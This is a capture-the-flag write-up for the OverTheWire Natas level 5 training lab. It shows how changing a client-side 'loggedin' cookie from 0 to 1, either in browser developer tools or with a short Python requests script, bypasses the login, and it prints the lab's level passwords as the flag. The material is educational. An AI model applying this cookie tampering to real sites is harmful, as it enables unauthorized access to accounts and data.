# Natas Level 5 Writeup (natas5) – OverTheWire

## Overview

This level focuses on bypassing access control using client-side cookies.   
The goal is to find the password for the next level.

## Observation

When we open the website, we see the message:

> **"Access disallowed. You are not logged in"**

This suggests that authentication is controlled via a client-side mechanism, likely cookies.

## Finding the Password

### Using Browser
1. Open developer Tools ( <kbd>F12</kbd> or <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>i</kbd>) and navigate to the `Application` Tab.
2. Locate the cookies for this page.
3. Identify the cookies:
    ```
    loggedin = 0
    ```
4. Modify the cookies value to:
    ```
    loggedin = 1
    ```
5. Refresh the page.   
The server now treats the user as logged in and reveals the password.

#### Proof
```text
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

### Using Python

```python
import requests, re

url = "http://natas5.natas.labs.overthewire.org/"
auth = ("natas5", "0n35PkggAPm2zbEpOU802c0x0Msn1ToK")

cookies = {
    'loggedin': '1'
}

res = requests.get(url, auth=auth, cookies=cookies)
match = re.search(r'<div.*?>\W(.*?)</div>', res.text)
print(match.group(1))
```

## Vulnerability

Authentication is controlled using a client-side cookie, which can be easily modified by the user.

## Flag
`0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

